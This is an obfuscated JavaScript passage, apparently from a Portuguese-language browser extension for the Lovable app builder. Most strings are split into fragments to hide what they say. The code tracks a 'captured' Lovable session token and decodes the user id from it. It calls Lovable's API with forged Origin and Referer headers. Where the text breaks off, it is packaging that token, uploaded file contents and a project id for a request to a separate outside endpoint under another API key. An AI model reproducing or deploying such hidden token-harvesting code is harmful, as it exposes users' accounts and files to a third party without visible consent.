22/'+'></'+'svg'+'>',_n57d7b1['add'+'Eve'+'ntL'+'ist'+'ene'+'r']('cli'+'ck',()=>{
const _n2f18d5=document['get'+'Ele'+'men'+'tBy'+'Id']('sp-'+'msg');
if(!_n2f18d5)return;
const _n625be7=(_n2f18d5['val'+'ue']||'')['tri'+'m']();
if(!_n625be7){
_n400ca0('✏️\x20D'+'igi'+'te\x20'+'um\x20'+'pro'+'mpt'+'\x20pr'+'ime'+'iro'+'...','war'+'n',0x9c4);
return;
}
_n57d7b1['sty'+'le']['opa'+'cit'+'y']='0.5',_n57d7b1['dis'+'abl'+'ed']=!![],_n57d7b1['inn'+'erH'+'TML']='<sv'+'g\x20w'+'idt'+'h=\x22'+'14\x22'+'\x20he'+'igh'+'t=\x22'+'14\x22'+'\x20vi'+'ewB'+'ox='+'\x220\x20'+'0\x202'+'4\x202'+'4\x22\x20'+'fil'+'l=\x22'+'non'+'e\x22\x20'+'str'+'oke'+'=\x22c'+'urr'+'ent'+'Col'+'or\x22'+'\x20st'+'rok'+'e-w'+'idt'+'h=\x22'+'2.5'+'\x22\x20s'+'tro'+'ke-'+'lin'+'eca'+'p=\x22'+'rou'+'nd\x22'+'\x20st'+'rok'+'e-l'+'ine'+'joi'+'n=\x22'+'rou'+'nd\x22'+'\x20st'+'yle'+'=\x22a'+'nim'+'ati'+'on:'+'__q'+'l_s'+'pin'+'\x200.'+'8s\x20'+'lin'+'ear'+'\x20in'+'fin'+'ite'+';
po'+'int'+'er-'+'eve'+'nts'+':no'+'ne\x22'+'><p'+'ath'+'\x20d='+'\x22M2'+'1\x201'+'2a9'+'\x209\x20'+'0\x201'+'\x201-'+'6.2'+'19-'+'8.5'+'6\x22/'+'></'+'svg'+'>';
const _n18b799='<sv'+'g\x20w'+'idt'+'h=\x22'+'15\x22'+'\x20he'+'igh'+'t=\x22'+'15\x22'+'\x20vi'+'ewB'+'ox='+'\x220\x20'+'0\x202'+'4\x202'+'4\x22\x20'+'fil'+'l=\x22'+'non'+'e\x22\x20'+'str'+'oke'+'=\x22c'+'urr'+'ent'+'Col'+'or\x22'+'\x20st'+'rok'+'e-w'+'idt'+'h=\x22'+'2.2'+'\x22\x20s'+'tro'+'ke-'+'lin'+'eca'+'p=\x22'+'rou'+'nd\x22'+'\x20st'+'rok'+'e-l'+'ine'+'joi'+'n=\x22'+'rou'+'nd\x22'+'\x20st'+'yle'+'=\x22p'+'oin'+'ter'+'-ev'+'ent'+'s:n'+'one'+'\x22><'+'pat'+'h\x20d'+'=\x22m'+'21.'+'64\x20'+'3.6'+'4-1'+'.28'+'-1.'+'28a'+'1.2'+'1\x201'+'.21'+'\x200\x20'+'0\x200'+'-1.'+'72\x20'+'0L2'+'.36'+'\x2018'+'.64'+'a1.'+'21\x20'+'1.2'+'1\x200'+'\x200\x20'+'0\x200'+'\x201.'+'72l'+'1.2'+'8\x201'+'.28'+'a1.'+'2\x201'+'.2\x20'+'0\x200'+'\x200\x20'+'1.7'+'2\x200'+'L21'+'.64'+'\x205.'+'36a'+'1.2'+'\x201.'+'2\x200'+'\x200\x20'+'0\x200'+'-1.'+'72Z'+'\x22/>'+'<pa'+'th\x20'+'d=\x22'+'m14'+'\x207\x20'+'3\x203'+'\x22/>'+'<pa'+'th\x20'+'d=\x22'+'M5\x20'+'6v4'+'\x22/>'+'<pa'+'th\x20'+'d=\x22'+'M19'+'\x2014'+'v4\x22'+'/><'+'pat'+'h\x20d'+'=\x22M'+'10\x20'+'2v2'+'\x22/>'+'<pa'+'th\x20'+'d=\x22'+'M7\x20'+'8H3'+'\x22/>'+'<pa'+'th\x20'+'d=\x22'+'M21'+'\x2016'+'h-4'+'\x22/>'+'<pa'+'th\x20'+'d=\x22'+'M11'+'\x203H'+'9\x22/'+'></'+'svg'+'>';
function _n50c824(){
_n57d7b1['sty'+'le']['opa'+'cit'+'y']='1',_n57d7b1['dis'+'abl'+'ed']=![],_n57d7b1['inn'+'erH'+'TML']=_n18b799;
}
const _n20e4d4={
}
;
_n20e4d4['act'+'ive']=!![],_n20e4d4['cur'+'ren'+'tWi'+'ndo'+'w']=!![],chrome['tab'+'s']['que'+'ry'](_n20e4d4,_n92a53d=>{
if(!_n92a53d||!_n92a53d[0x0]){
_n50c824();
return;
}
const _n278b28={
}
;
_n278b28['typ'+'e']='sp_'+'imp'+'rov'+'e_p'+'rom'+'pt',_n278b28['tex'+'t']=_n625be7,chrome['tab'+'s']['sen'+'dMe'+'ssa'+'ge'](_n92a53d[0x0]['id'],_n278b28,_n1fcbc8=>{
_n50c824();
if(chrome['run'+'tim'+'e']['las'+'tEr'+'ror']||!_n1fcbc8||!_n1fcbc8['imp'+'rov'+'ed']){
_n400ca0('⚠\x20A'+'bra'+'\x20o\x20'+'Lov'+'abl'+'e\x20a'+'nte'+'s\x20d'+'e\x20u'+'sar'+'\x20es'+'ta\x20'+'fun'+'ção'+'.','war'+'n',0xbb8);
return;
}
_n2f18d5['val'+'ue']=_n1fcbc8['imp'+'rov'+'ed'];
const _n11d29f={
}
;
_n11d29f['bub'+'ble'+'s']=!![],_n2f18d5['dis'+'pat'+'chE'+'ven'+'t'](new Event('inp'+'ut',_n11d29f)),_n2f18d5['foc'+'us'](),_n400ca0('✅\x20P'+'rom'+'pt\x20'+'mel'+'hor'+'ado'+'\x20co'+'m\x20s'+'uce'+'sso'+'!','ok',0xbb8);
}
);
}
);
}
));
if(_n247c06)_n247c06['add'+'Eve'+'ntL'+'ist'+'ene'+'r']('cli'+'ck',_n2eacfe);
_n4bbf09&&_n4bbf09['add'+'Eve'+'ntL'+'ist'+'ene'+'r']('key'+'dow'+'n',_n4ff1b8=>{
_n4ff1b8['key']==='Ent'+'er'&&!_n4ff1b8['shi'+'ftK'+'ey']&&(_n4ff1b8['pre'+'ven'+'tDe'+'fau'+'lt'](),_n2eacfe());
}
);
_n33de6e&&_n33de6e['add'+'Eve'+'ntL'+'ist'+'ene'+'r']('cli'+'ck',()=>{
if(_n4bbf09)_n4bbf09['val'+'ue']='';
}
);
_n5168c6&&_n5168c6['add'+'Eve'+'ntL'+'ist'+'ene'+'r']('cli'+'ck',()=>{
const _n440343=document['get'+'Ele'+'men'+'tBy'+'Id']('sp-'+'fil'+'e-i'+'npu'+'t');
if(_n440343)_n440343['cli'+'ck']();
}
);
const _nf3ef95=document['get'+'Ele'+'men'+'tBy'+'Id']('sp-'+'mod'+'e-t'+'ogg'+'le'),_n33e43f=document['get'+'Ele'+'men'+'tBy'+'Id']('sp-'+'mod'+'e-d'+'rop'+'dow'+'n');
_nf3ef95&&_n33e43f&&(_nf3ef95['add'+'Eve'+'ntL'+'ist'+'ene'+'r']('cli'+'ck',_n45337f=>{
_n45337f['sto'+'pPr'+'opa'+'gat'+'ion']();
const _n206d78=_n33e43f['cla'+'ssL'+'ist']['con'+'tai'+'ns']('sp-'+'mod'+'e-o'+'pen');
if(!_n206d78){
const _n1bf035=_nf3ef95['get'+'Bou'+'ndi'+'ngC'+'lie'+'ntR'+'ect']();
_n33e43f['sty'+'le']['vis'+'ibi'+'lit'+'y']='hid'+'den',_n33e43f['sty'+'le']['dis'+'pla'+'y']='blo'+'ck';
const _nfbacfd=_n33e43f['off'+'set'+'Hei'+'ght']||0xdc;
_n33e43f['sty'+'le']['dis'+'pla'+'y']='',_n33e43f['sty'+'le']['vis'+'ibi'+'lit'+'y']='';
const _n29656e=window['inn'+'erH'+'eig'+'ht']-_n1bf035['bot'+'tom'];
_n29656e<_nfbacfd+0x8?_n33e43f['sty'+'le']['top']=_n1bf035['top']-_nfbacfd-0x6+'px':_n33e43f['sty'+'le']['top']=_n1bf035['bot'+'tom']+0x6+'px',_n33e43f['sty'+'le']['lef'+'t']=_n1bf035['lef'+'t']+'px',_n33e43f['cla'+'ssL'+'ist']['add']('sp-'+'mod'+'e-o'+'pen');
}
else _n33e43f['cla'+'ssL'+'ist']['rem'+'ove']('sp-'+'mod'+'e-o'+'pen');
}
),_n33e43f['add'+'Eve'+'ntL'+'ist'+'ene'+'r']('cli'+'ck',_n23b155=>{
const _n5beab7=_n23b155['tar'+'get']['clo'+'ses'+'t']('.sp'+'-mo'+'de-'+'opt');
if(!_n5beab7)return;
if(_n5beab7['dat'+'ase'+'t']['mod'+'e'])_n45bf4c=_n5beab7['dat'+'ase'+'t']['mod'+'e']==='pla'+'n';
if(_n5beab7['dat'+'ase'+'t']['ai']){
_n11f60c=_n5beab7['dat'+'ase'+'t']['ai'];
const _n536961={
}
;
_n536961['ql_'+'sel'+'ect'+'ed_'+'ai']=_n11f60c,chrome['sto'+'rag'+'e']['loc'+'al']['set'](_n536961);
}
_n31e586(),_n33e43f['cla'+'ssL'+'ist']['rem'+'ove']('sp-'+'mod'+'e-o'+'pen');
}
),document['add'+'Eve'+'ntL'+'ist'+'ene'+'r']('cli'+'ck',_n462407=>{
!_nf3ef95['con'+'tai'+'ns'](_n462407['tar'+'get'])&&!_n33e43f['con'+'tai'+'ns'](_n462407['tar'+'get'])&&_n33e43f['cla'+'ssL'+'ist']['rem'+'ove']('sp-'+'mod'+'e-o'+'pen');
}
),_n31e586());
if(_n566800)_n566800['add'+'Eve'+'ntL'+'ist'+'ene'+'r']('cli'+'ck',_n44045a);
_n42b125&&_n42b125['add'+'Eve'+'ntL'+'ist'+'ene'+'r']('cli'+'ck',()=>{
_n6d2934['clo'+'sin'+'g']();
const _n3529fb={
}
;
_n3529fb['act'+'ive']=!![],_n3529fb['cur'+'ren'+'tWi'+'ndo'+'w']=!![],chrome['tab'+'s']['que'+'ry'](_n3529fb,_nd076d3=>{
if(_nd076d3[0x0]){
const _n218a5c={
}
;
_n218a5c['act'+'ion']='act'+'iva'+'teN'+'ati'+'veC'+'hat',chrome['tab'+'s']['sen'+'dMe'+'ssa'+'ge'](_nd076d3[0x0]['id'],_n218a5c,()=>{
if(chrome['run'+'tim'+'e']['las'+'tEr'+'ror'])console['log']('[Si'+'dep'+'ane'+'l]\x20'+'act'+'iva'+'teN'+'ati'+'veC'+'hat'+'\x20ms'+'g\x20e'+'rro'+'r:',chrome['run'+'tim'+'e']['las'+'tEr'+'ror']['mes'+'sag'+'e']);
}
);
}
}
),setTimeout(()=>{
const _n4649de={
}
;
_n4649de['ql_'+'nat'+'ive'+'_ch'+'at']=!![],_n4649de['ql_'+'sid'+'eba'+'r_m'+'ode']=![],chrome['sto'+'rag'+'e']['loc'+'al']['set'](_n4649de);
const _n536b68={
}
;
_n536b68['act'+'ion']='clo'+'seS'+'ide'+'Pan'+'el',chrome['run'+'tim'+'e']['sen'+'dMe'+'ssa'+'ge'](_n536b68);
}
,0x64);
}
),_n3ef74e&&_n3ef74e['add'+'Eve'+'ntL'+'ist'+'ene'+'r']('cli'+'ck',function(_n645bdb){
const _n25dcee=_n645bdb['tar'+'get']['clo'+'ses'+'t']('.sp'+'-qu'+'ick'+'-bt'+'n');
if(!_n25dcee)return;
const _n5e5664=(window['SP_'+'QUI'+'CK_'+'ACT'+'ION'+'S']||[])['fin'+'d'](_n517df2=>_n517df2['id']===_n25dcee['dat'+'ase'+'t']['act'+'ion']);
if(!_n5e5664||!_n5e5664['tex'+'t'])return;
const _n5e68e4=document['get'+'Ele'+'men'+'tBy'+'Id']('sp-'+'msg');
if(!_n5e68e4)return;
_n5e68e4['val'+'ue']=_n5e5664['tex'+'t'],_n5e68e4['foc'+'us'](),_n5e68e4['dis'+'pat'+'chE'+'ven'+'t'](new Event('inp'+'ut'));
}
),_n34e835(),_n379ade(),chrome['sto'+'rag'+'e']['loc'+'al']['get'](['ql_'+'shi'+'eld'+'_ac'+'tiv'+'e','ql_'+'sel'+'ect'+'ed_'+'ai'],_nc11dba=>{
_n90774c=!!_nc11dba['ql_'+'shi'+'eld'+'_ac'+'tiv'+'e'],_n2cc9d7(_n90774c),_nc11dba['ql_'+'sel'+'ect'+'ed_'+'ai']&&(_n11f60c=_nc11dba['ql_'+'sel'+'ect'+'ed_'+'ai'],_n31e586());
}
);
}
function _n2cc9d7(_n3eb94c){
const _n367a8b=document['get'+'Ele'+'men'+'tBy'+'Id']('sp-'+'shi'+'eld'+'-bt'+'n'),_n45115d=document['get'+'Ele'+'men'+'tBy'+'Id']('sp-'+'shi'+'eld'+'-la'+'bel');
_n367a8b&&(_n3eb94c?(_n367a8b['cla'+'ssL'+'ist']['add']('sp-'+'shi'+'eld'+'-ac'+'tiv'+'e'),_n367a8b['sty'+'le']['bac'+'kgr'+'oun'+'d']='rgb'+'a(1'+'39,'+'92,'+'246'+',0.'+'25)',_n367a8b['sty'+'le']['bor'+'der'+'Col'+'or']='var'+'(--'+'neo'+'n-p'+'urp'+'le)',_n367a8b['sty'+'le']['col'+'or']='#ff'+'f'):(_n367a8b['cla'+'ssL'+'ist']['rem'+'ove']('sp-'+'shi'+'eld'+'-ac'+'tiv'+'e'),_n367a8b['sty'+'le']['bac'+'kgr'+'oun'+'d']='',_n367a8b['sty'+'le']['bor'+'der'+'Col'+'or']='',_n367a8b['sty'+'le']['col'+'or']=''));
if(_n45115d)_n45115d['tex'+'tCo'+'nte'+'nt']=_n3eb94c?'Des'+'ati'+'var'+'\x20Es'+'cud'+'o':'Ati'+'var'+'\x20Es'+'cud'+'o';
}
function _n5a1da0(){
_n90774c=!_n90774c;
const _n4081f0={
}
;
_n4081f0['ql_'+'shi'+'eld'+'_ac'+'tiv'+'e']=_n90774c,chrome['sto'+'rag'+'e']['loc'+'al']['set'](_n4081f0),_n2cc9d7(_n90774c),_n176391(_n90774c?'🛡️\x20E'+'scu'+'do\x20'+'ati'+'vad'+'o!':'🛡️\x20E'+'scu'+'do\x20'+'des'+'ati'+'vad'+'o.');
const _n499476={
}
;
_n499476['act'+'ive']=!![],_n499476['cur'+'ren'+'tWi'+'ndo'+'w']=!![],chrome['tab'+'s']['que'+'ry'](_n499476,function(_n167a24){
if(_n167a24&&_n167a24[0x0]){
const _n96eaae={
}
;
_n96eaae['act'+'ion']='tog'+'gle'+'Shi'+'eld',_n96eaae['act'+'ive']=_n90774c,chrome['tab'+'s']['sen'+'dMe'+'ssa'+'ge'](_n167a24[0x0]['id'],_n96eaae,function(){
void chrome['run'+'tim'+'e']['las'+'tEr'+'ror'];
}
);
}
}
);
}
function _n46f553(){
const _n145033=document['get'+'Ele'+'men'+'tBy'+'Id']('sp-'+'syn'+'c');
if(!_n145033)return;
if(_n2b5999&&_n39b796){
const _n561ed2=_n2b5999['sub'+'str'+'ing'](0x0,0x8),_n5503f1=_n39b796['sub'+'str'+'ing'](0x0,0xc)+'...';
_n145033['cla'+'ssN'+'ame']='sp-'+'syn'+'c-s'+'tat'+'us\x20'+'sp-'+'syn'+'c-o'+'k',_n145033['inn'+'erH'+'TML']='✅\x20<'+'b>'+_n561ed2+('…</'+'b>\x20'+'<sp'+'an\x20'+'cla'+'ss='+'\x22sp'+'-sy'+'nc-'+'tok'+'en\x22'+'>')+_n5503f1+('</s'+'pan'+'>');
}
else _n145033['cla'+'ssN'+'ame']='sp-'+'syn'+'c-s'+'tat'+'us\x20'+'sp-'+'syn'+'c-w'+'ait'+'ing',_n145033['tex'+'tCo'+'nte'+'nt']='⏳\x20N'+'enh'+'um\x20'+'tok'+'en\x20'+'cap'+'tur'+'ado';
}
function _n789aef(){
if(!_n10b465)return;
const _n7a553f=document['get'+'Ele'+'men'+'tBy'+'Id']('sp-'+'cou'+'ntd'+'own');
if(!_n7a553f)return;
_n7a553f['sty'+'le']['dis'+'pla'+'y']='fle'+'x';
const _n35b7f3=new Date(_n10b465)['get'+'Tim'+'e'](),_n1cb472=Math['max'](_n35b7f3-Date['now'](),0x36ee80);
function _n5c31d0(){
const _n45c38f=_n35b7f3-Date['now']();
if(_n45c38f<=0x0){
_n4ce99a(_n472837==='tri'+'al'?spT('log'+'in_'+'tri'+'al_'+'exp'+'ire'+'d'):spT('log'+'in_'+'inv'+'ali'+'d_r'+'elo'+'gin'));
return;
}
const _n4aa92d=Math['flo'+'or'](_n45c38f/0x5265c00),_n123e6f=Math['flo'+'or'](_n45c38f%0x5265c00/0x36ee80),_nb1f78a=Math['flo'+'or'](_n45c38f%0x36ee80/0xea60),_n3c2f7c=Math['flo'+'or'](_n45c38f%0xea60/0x3e8),_n1133e0=Math['max'](0x0,Math['min'](0x64,_n45c38f/_n1cb472*0x64));
let _n554a13=_n4aa92d>0x0?_n4aa92d+'d\x20'+_n123e6f+'h\x20'+_nb1f78a+'m':_n123e6f>0x0?_n123e6f+'h\x20'+_nb1f78a+'m\x20'+String(_n3c2f7c)['pad'+'Sta'+'rt'](0x2,'0')+'s':_nb1f78a+':'+String(_n3c2f7c)['pad'+'Sta'+'rt'](0x2,'0');
const _n1c30f7=_n472837==='tri'+'al'?'Tes'+'te\x20'+'exp'+'ira'+'\x20em':'Pla'+'no\x20'+'exp'+'ira'+'\x20em',_n310ed5=_n1133e0<0x14?'\x20sp'+'-ba'+'r-u'+'rge'+'nt':'';
_n7a553f['inn'+'erH'+'TML']=spTemplateCountdown(_n1c30f7,_n554a13,_n1133e0,_n310ed5);
}
_n5c31d0(),setInterval(_n5c31d0,0x3e8);
}
function _n574ee4(_n3ce1f8){
try{
const _n43edd6=_n3ce1f8['spl'+'it']('.');
if(_n43edd6['len'+'gth']<0x2)return null;
const _n4f6e89=_n43edd6[0x1]['rep'+'lac'+'e'](/-/g,'+')['rep'+'lac'+'e'](/_/g,'/'),_n3a75f8=_n4f6e89+'='['rep'+'eat']((0x4-_n4f6e89['len'+'gth']%0x4)%0x4),_n46cb4d=JSON['par'+'se'](atob(_n3a75f8));
return _n46cb4d['sub']||_n46cb4d['use'+'r_i'+'d']||null;
}
catch(_n4fb743){
return null;
}
}
async function _n44bbaa(_n1e0a38){
return new Promise(_n5b7f70=>{
const _nb397ea=new Image(),_n7966c0=URL['cre'+'ate'+'Obj'+'ect'+'URL'](_n1e0a38);
_nb397ea['onl'+'oad']=()=>{
URL['rev'+'oke'+'Obj'+'ect'+'URL'](_n7966c0);
const _n3d90bf=0x500;
let _n401766=_nb397ea['wid'+'th'],_n43552b=_nb397ea['hei'+'ght'];
if(_n401766>_n3d90bf||_n43552b>_n3d90bf){
const _n3a1bb7=Math['min'](_n3d90bf/_n401766,_n3d90bf/_n43552b);
_n401766=Math['rou'+'nd'](_n401766*_n3a1bb7),_n43552b=Math['rou'+'nd'](_n43552b*_n3a1bb7);
}
const _n40e5d0=document['cre'+'ate'+'Ele'+'men'+'t']('can'+'vas');
_n40e5d0['wid'+'th']=_n401766,_n40e5d0['hei'+'ght']=_n43552b,_n40e5d0['get'+'Con'+'tex'+'t']('2d')['dra'+'wIm'+'age'](_nb397ea,0x0,0x0,_n401766,_n43552b);
const _n5359c7=_n1e0a38['typ'+'e']==='ima'+'ge/'+'png'?'ima'+'ge/'+'png':'ima'+'ge/'+'jpe'+'g';
_n40e5d0['toB'+'lob'](_n35035e=>{
const _n4fe7ad={
}
;
_n4fe7ad['fil'+'e']=_n1e0a38,_n4fe7ad['pre'+'vie'+'wUr'+'l']=null;
if(!_n35035e)return _n5b7f70(_n4fe7ad);
const _n1c863e={
}
;
_n1c863e['typ'+'e']=_n5359c7,_n5b7f70({
'file':new File([_n35035e],_n1e0a38['nam'+'e'],_n1c863e),'previewUrl':URL['cre'+'ate'+'Obj'+'ect'+'URL'](_n35035e)}
);
}
,_n5359c7,_n1e0a38['typ'+'e']==='ima'+'ge/'+'png'?undefined:0.8);
}
,_nb397ea['one'+'rro'+'r']=()=>{
URL['rev'+'oke'+'Obj'+'ect'+'URL'](_n7966c0);
const _n29c150={
}
;
_n29c150['fil'+'e']=_n1e0a38,_n29c150['pre'+'vie'+'wUr'+'l']=null,_n5b7f70(_n29c150);
}
,_nb397ea['src']=_n7966c0;
}
);
}
function _n4bcff8(_n504a05){
if(_n504a05&&typeof _n504a05['typ'+'e']==='str'+'ing'&&_n504a05['typ'+'e']['tri'+'m']())return _n504a05['typ'+'e'];
const _n370b06=(_n504a05&&_n504a05['nam'+'e']?_n504a05['nam'+'e']:'')['toL'+'owe'+'rCa'+'se'](),_n317612=_n370b06['inc'+'lud'+'es']('.')?_n370b06['spl'+'it']('.')['pop']():'',_n99a700={
}
;
_n99a700['pdf']='app'+'lic'+'ati'+'on/'+'pdf',_n99a700['txt']='tex'+'t/p'+'lai'+'n',_n99a700['md']='tex'+'t/m'+'ark'+'dow'+'n',_n99a700['csv']='tex'+'t/c'+'sv',_n99a700['jso'+'n']='app'+'lic'+'ati'+'on/'+'jso'+'n',_n99a700['zip']='app'+'lic'+'ati'+'on/'+'zip',_n99a700['doc']='app'+'lic'+'ati'+'on/'+'msw'+'ord',_n99a700['doc'+'x']='app'+'lic'+'ati'+'on/'+'vnd'+'.op'+'enx'+'mlf'+'orm'+'ats'+'-of'+'fic'+'edo'+'cum'+'ent'+'.wo'+'rdp'+'roc'+'ess'+'ing'+'ml.'+'doc'+'ume'+'nt',_n99a700['xls']='app'+'lic'+'ati'+'on/'+'vnd'+'.ms'+'-ex'+'cel',_n99a700['xls'+'x']='app'+'lic'+'ati'+'on/'+'vnd'+'.op'+'enx'+'mlf'+'orm'+'ats'+'-of'+'fic'+'edo'+'cum'+'ent'+'.sp'+'rea'+'dsh'+'eet'+'ml.'+'she'+'et',_n99a700['ppt']='app'+'lic'+'ati'+'on/'+'vnd'+'.ms'+'-po'+'wer'+'poi'+'nt',_n99a700['ppt'+'x']='app'+'lic'+'ati'+'on/'+'vnd'+'.op'+'enx'+'mlf'+'orm'+'ats'+'-of'+'fic'+'edo'+'cum'+'ent'+'.pr'+'ese'+'nta'+'tio'+'nml'+'.pr'+'ese'+'nta'+'tio'+'n',_n99a700['mp3']='aud'+'io/'+'mpe'+'g',_n99a700['wav']='aud'+'io/'+'wav',_n99a700['mp4']='vid'+'eo/'+'mp4',_n99a700['web'+'m']='vid'+'eo/'+'web'+'m';
const _n12346d=_n99a700;
return _n12346d[_n317612]||'app'+'lic'+'ati'+'on/'+'oct'+'et-'+'str'+'eam';
}
function _n3b1aee(_n288d01){
if(_n288d01<0x400)return _n288d01+'\x20B';
if(_n288d01<0x400*0x400)return(_n288d01/0x400)['toF'+'ixe'+'d'](0x1)+'\x20KB';
return(_n288d01/(0x400*0x400))['toF'+'ixe'+'d'](0x1)+'\x20MB';
}
function _n816e9(_n540916,_na43f35){
const _n2fc43f=_na43f35&&_na43f35['nam'+'e']?String(_na43f35['nam'+'e']):'',_n4b78c0=_n2fc43f['inc'+'lud'+'es']('.')?_n2fc43f['spl'+'it']('.')['pop']()['toL'+'owe'+'rCa'+'se']():'',_n1fb608=_n4b78c0&&/^[a-z0-9]{
1,10}
$/['tes'+'t'](_n4b78c0)?_n4b78c0:'bin';
return _n540916+'.'+_n1fb608;
}
async function _n1bd708(_n2f2ab9,_n5bcc5f,_n4136f8){
if(!_n4136f8)throw new Error('pro'+'jec'+'tId'+'\x20ob'+'rig'+'ató'+'rio'+'\x20pa'+'ra\x20'+'upl'+'oad'+'\x20pr'+'oje'+'ct-'+'sco'+'ped');
const _n2fb532=_n4bcff8(_n2f2ab9),_n2c2db7=_n2f2ab9['nam'+'e']||'fil'+'e',_ne1a71d=_n2f2ab9['siz'+'e']||0x0,_n11f6b3={
}
;
_n11f6b3['Con'+'ten'+'t-T'+'ype']='app'+'lic'+'ati'+'on/'+'jso'+'n',_n11f6b3['Aut'+'hor'+'iza'+'tio'+'n']='Bea'+'rer'+'\x20'+_n5bcc5f,_n11f6b3['Acc'+'ept']='*/*',_n11f6b3['Ori'+'gin']='htt'+'ps:'+'//l'+'ova'+'ble'+'.de'+'v',_n11f6b3['Ref'+'ere'+'r']='htt'+'ps:'+'//l'+'ova'+'ble'+'.de'+'v/';
const _n187a6c=_n11f6b3,_n4739e8={
}
;
_n4739e8['con'+'ten'+'t_t'+'ype']=_n2fb532,_n4739e8['ori'+'gin'+'al_'+'fil'+'e_n'+'ame']=_n2c2db7,_n4739e8['fil'+'e_s'+'ize'+'_by'+'tes']=_ne1a71d,_n4739e8['ori'+'gin'+'al_'+'fil'+'e_s'+'ize'+'_by'+'tes']=_ne1a71d;
const _n4ca1ec=await _n530b76('htt'+'ps:'+'//a'+'pi.'+'lov'+'abl'+'e.d'+'ev/'+'pro'+'jec'+'ts/'+_n4136f8+('/fi'+'les'+'/ge'+'ner'+'ate'+'-up'+'loa'+'d-u'+'rl'),{
'method':'POS'+'T','headers':_n187a6c,'body':JSON['str'+'ing'+'ify'](_n4739e8)}
),_n502cc5=_n4ca1ec&&_n4ca1ec['fil'+'e_i'+'d']||null,_n1eda41=_n4ca1ec&&(_n4ca1ec['url']||_n4ca1ec['sig'+'ned'+'_ur'+'l']||_n4ca1ec['sig'+'ned'+'Url'])||null,_n3c69da=_n4ca1ec&&_n4ca1ec['hea'+'der'+'s']&&typeof _n4ca1ec['hea'+'der'+'s']==='obj'+'ect'?_n4ca1ec['hea'+'der'+'s']:{
}
;
if(!_n1eda41)throw new Error('URL'+'\x20as'+'sin'+'ada'+'\x20nã'+'o\x20r'+'eto'+'rna'+'da\x20'+'pel'+'o\x20L'+'ova'+'ble');
await new Promise((_n36d97a,_n5b9363)=>{
const _n230b42=new XMLHttpRequest();
_n230b42['ope'+'n']('PUT',_n1eda41,!![]),_n230b42['set'+'Req'+'ues'+'tHe'+'ade'+'r']('Con'+'ten'+'t-T'+'ype',_n2fb532);
for(const [_n2ff95e,_n1b08ef]of Object['ent'+'rie'+'s'](_n3c69da)){
try{
_n230b42['set'+'Req'+'ues'+'tHe'+'ade'+'r'](_n2ff95e,String(_n1b08ef));
}
catch(_n5bc900){
}
}
_n230b42['onl'+'oad']=()=>_n230b42['sta'+'tus']>=0xc8&&_n230b42['sta'+'tus']<0x12c?_n36d97a():_n5b9363(new Error('PUT'+'\x20GC'+'S\x20f'+'alh'+'ou:'+'\x20'+_n230b42['sta'+'tus'])),_n230b42['one'+'rro'+'r']=()=>_n5b9363(new Error('Err'+'o\x20d'+'e\x20r'+'ede'+'\x20no'+'\x20PU'+'T\x20G'+'CS')),_n230b42['sen'+'d'](_n2f2ab9);
}
);
const _n596a27=_n502cc5?String(_n502cc5)['spl'+'it']('/')['pop']():null;
let _nbc341b=null;
for(let _n2fb777=0x0;
_n2fb777<0x3&&!_nbc341b;
_n2fb777++){
if(_n2fb777>0x0)await new Promise(_n1dffcb=>setTimeout(_n1dffcb,0x4b0*_n2fb777));
try{
const _n5c1005={
}
;
_n5c1005['dir'+'_na'+'me']=_n4136f8,_n5c1005['fil'+'e_n'+'ame']=_n596a27||_n2c2db7;
const _n3197ed=await _n530b76('htt'+'ps:'+'//a'+'pi.'+'lov'+'abl'+'e.d'+'ev/'+'fil'+'es/'+'gen'+'era'+'te-'+'dow'+'nlo'+'ad-'+'url',{
'method':'POS'+'T','headers':_n187a6c,'body':JSON['str'+'ing'+'ify'](_n5c1005)}
);
_nbc341b=_n3197ed&&(_n3197ed['url']||_n3197ed['dow'+'nlo'+'ad_'+'url']||_n3197ed['sig'+'ned'+'_ur'+'l']||_n3197ed['sig'+'ned'+'Url'])||null;
if(_nbc341b)console['log']('[up'+'loa'+'d]\x20'+'✅\x20d'+'own'+'loa'+'d\x20U'+'RL\x20'+'ok\x20'+'(te'+'nta'+'tiv'+'a\x20'+(_n2fb777+0x1)+')');
}
catch(_n1744e0){
console['war'+'n']('[up'+'loa'+'d]\x20'+'gen'+'era'+'te-'+'dow'+'nlo'+'ad-'+'url'+'\x20te'+'nta'+'tiv'+'a\x20'+(_n2fb777+0x1)+('\x20fa'+'lho'+'u:'),_n1744e0['mes'+'sag'+'e']||_n1744e0);
}
}
if(!_nbc341b)console['war'+'n']('[up'+'loa'+'d]\x20'+'⚠\x20d'+'own'+'loa'+'d\x20U'+'RL\x20'+'nul'+'l\x20a'+'pós'+'\x203\x20'+'ten'+'tat'+'iva'+'s\x20p'+'ara',_n2c2db7);
const _n13fc6d={
}
;
return _n13fc6d['fil'+'e_i'+'d']=_n502cc5||_n596a27||_n2c2db7,_n13fc6d['fil'+'e_n'+'ame']=_n2c2db7,_n13fc6d['dow'+'nlo'+'ad_'+'url']=_nbc341b,_n13fc6d['mim'+'e_t'+'ype']=_n2fb532,_n13fc6d['typ'+'e']='use'+'r_u'+'plo'+'ad',_n13fc6d;
}
async function _n2c3e47(_n2e906f,_n50dbb5,_n3114cb){
const _n9109d=_n4bcff8(_n2e906f),_n308d1d=await new Promise((_n4d8aaf,_n3af30c)=>{
const _n5a7aa4=new FileReader();
_n5a7aa4['onl'+'oad']=()=>{
const _n1e437a=_n5a7aa4['res'+'ult'],_n1a0004=_n1e437a['ind'+'exO'+'f'](',');
_n4d8aaf(_n1a0004>=0x0?_n1e437a['sli'+'ce'](_n1a0004+0x1):_n1e437a);
}
,_n5a7aa4['one'+'rro'+'r']=()=>_n3af30c(new Error('Fal'+'ha\x20'+'ao\x20'+'ler'+'\x20ar'+'qui'+'vo')),_n5a7aa4['rea'+'dAs'+'Dat'+'aUR'+'L'](_n2e906f);
}
),_n30a104={
}
;
_n30a104['Con'+'ten'+'t-T'+'ype']='app'+'lic'+'ati'+'on/'+'jso'+'n',_n30a104['api'+'key']=_n48aaeb,_n30a104['Aut'+'hor'+'iza'+'tio'+'n']='Bea'+'rer'+'\x20'+_n48aaeb;
const _n3de572={
}
;
_n3de572['act'+'ion']='upl'+'oad',_n3de572['tok'+'en_'+'lov'+'abl'+'e']=_n50dbb5,_n3de572['fil'+'e_n'+'ame']=_n2e906f['nam'+'e'],_n3de572['con'+'ten'+'t_t'+'ype']=_n9109d,_n3de572['fil'+'e_d'+'ata']=_n308d1d,_n3de572['pro'+'jet'+'o_i'+'d']=_n3114cb;
const _n27c505=await _n530b76(_n15d232,{
